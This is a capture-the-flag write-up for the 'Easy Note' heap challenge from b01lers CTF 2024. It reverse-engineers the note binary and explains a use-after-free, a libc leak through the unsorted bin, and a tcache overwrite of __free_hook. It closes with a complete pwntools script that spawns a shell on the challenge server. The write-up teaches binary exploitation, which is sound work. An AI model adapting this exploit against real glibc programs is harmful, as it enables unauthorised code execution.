---
title : "Easy Note - B01lers CTF 2024"
date : 2024-06-30
slug : b01lers-ctf-2024
aliases:
    - b01lers-ctf-2024
description: My (assisted) solve of "easy note" from b01lers CTF 2024
summary: Baby's first heap pwn! Understanding "Use after Free" and how the heap is laid out
tags:
    - b01lers-ctf
    - pwn
    - binary-exploitation
    - heap
---
## Background
Easy Note was a pwn challenge from b01lers CTF 2024. We're given a chal executable with the full set of glibc mitigations enabled. I solved this challenge in collaboration with Benson Liu and with a lot of guidance from Enzo (both members of Psi Beta Rho @ UCLA).
![image](https://hackmd.io/_uploads/BJsJj9yw0.png)
Upon running the executable, we are able to allocate a note of arbitrary size to the heap, free a note, view a note, edit a note, resize a note, or exit the program.
This challenge was built to be used with glibc version 2.27.

## Reverse Engineering
### Alloc
![image](https://hackmd.io/_uploads/Byw5T9yvR.png)
Chunk allocation is fairly simple. First, function `get_chunk_id()` (renamed by me) is called to ask the user for a location to allocate the note (and to ensure the location is valid and in bounds).  The size of the note is then asked for and returned with `get_chunk_size()` (using `sscanf`) and it is allocated using `malloc()`.
Finally, the allocated chunk is stored in a global array (whose base offset is located at `&dat_4040`).
### Free
![image](https://hackmd.io/_uploads/r1gcRcJPR.png)
The index of the desired chunk is checked for validity (using `get_chunk_id()`), then freed. Note - this does not prevent a double free. Futhermore, it does not clear the contents of the note before freeing the chunk.
### View
![image](https://hackmd.io/_uploads/r1BJJjkP0.png)
The index of the desired chunk is checked for validity, then the contents are displayed to the user using `puts`.
### Edit
![image](https://hackmd.io/_uploads/BJO7JiyvR.png)
The index of the desired chunk is checked for validity (as is the size of the desired edit). The current note is then edited with the provided user input. Note that there is no check in place to ensure that the chunk can handle an edit of the provided size.
### Resize
![image](https://hackmd.io/_uploads/SkpOki1PC.png)
The index of the desired chunk is checked for validity. Then, realloc is called on it using the size provided by the user.
## Issues and Exploit
The main vulnerability that we are exploiting here is rooted in the "free" function not clearing the data of a chunk before freeing it, leading to a "Use after Free" (UaF).
Given that this challenge was written using glibc 2.27, we are able to take advantage of the still-present `__free_hook` (containing a pointer to the function that free uses whenever it is called).  If we're able to leak the address of libc and overwrite `__free_hook` with `/bin/sh`, we'll be able to pop a shell and cat the flag.

### Exploit Background
#### Bins
When heap chunks are freed, the heap manager must keep track of the freed chunks internally so they can be reused by malloc during allocation requests. There are 5 types of "bins" the heap manager can store a freed chunk in. These are the small bin, large bin, fast bin, unsorted bin, and tcache bin.  Most relevantly to this challenge, the unsorted bin holds free chunks of any size (which are linked together with forward and backward pointers). Chunks are linked into the unsorted bin if they are either outside of fastbin range (size >= 0x90) or outside of tcache range (if tcache is present, >= 0x420).
If we can create and free our top chunk such that it ends up in unsorted bin, it will point into libc.  We can then calculate the libc base and write to `__free_hook`
#### Chunk Consolidation
Chunk consolidation is the process of merging two or more free chunks on the heap into a larger free chunk to avoid fragmentation. This can become an issue when trying to take advantage of a UaF - thus, we can create "barrier" chunks (small chunks that are not freed) in between relevant chunks we are using to prevent this process.
### Final Exploit
The final path of our exploit is as such:
1. Allocate a chunk of size 0x420 or greater (to ensure it enters the unsorted bin).
2. Free it
3. Read the freed pointer from unsorted bin to get a pointer to libc
4. Calculate the libc base
5. Use libc base to write to `__free_hook`, `system`.
6. Write `/bin/sh` to some chunl
7. Call `free` with pointer to the chunk containing `bin/sh` to get a shell
8. Profit
### Solve Script
```python=
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./chal_patched")
ld = ELF("./ld-2.27.so")
libc = ELF("./libc.so.6")

REMOTE = True

r = remote('gold.b01le.rs', 4001) if REMOTE else process([exe.path])
# gdb.attach(r)

PROMPT = b"-----Resize----" if REMOTE else b">"

def alloc(idx, size):
    r.sendlineafter(PROMPT, b"1")
    r.sendlineafter(b"Where? ", str(idx).encode())
    r.sendlineafter(b"size? ", str(size).encode())

def free(idx):
    r.sendlineafter(PROMPT, b"2")
    r.sendlineafter(b"Where? ", str(idx).encode())

def view(idx):
    r.sendlineafter(PROMPT, b"3")
    r.sendlineafter(b"Where? ", str(idx).encode())
    return r.recvline().strip()

def edit(idx, data):
    r.sendlineafter(PROMPT, b"4")
    r.sendlineafter(b"Where? ", str(idx).encode())
    r.sendafter(b"size? ", str(len(data) + 2).encode())
    r.send(data)

def exit(r):
    r.sendlineafter(PROMPT, b"5")

def resize(idx, size):
    r.sendlineafter(PROMPT, b"6")
    r.sendlineafter(b"Where? ", str(idx).encode())
    r.sendlineafter(b"size? ", str(size).encode())


alloc(1, 0x420) # 0x420 is max tcache size
alloc(2, 0x18) # barrier to prevent combining with top chunk 
free(1)
libc.address = u64(view(1).ljust(8, b"\x00")) - 0x3afca0
log.info(hex(libc.address))

alloc(3, 0x18)
alloc(4, 0x18)
alloc(5, 0x18) # barrier

free(3)
free(4) # has forward pointer to 3

edit(4, b"\x00" + p64(libc.sym.__free_hook))

alloc(6, 0x18)
alloc(7, 0x18)

edit(7, b"\x00" + p64(libc.sym.system))

alloc(8, 0x18)
edit(8, b"\x00/bin/sh\x00")

free(8)

r.interactive()
```
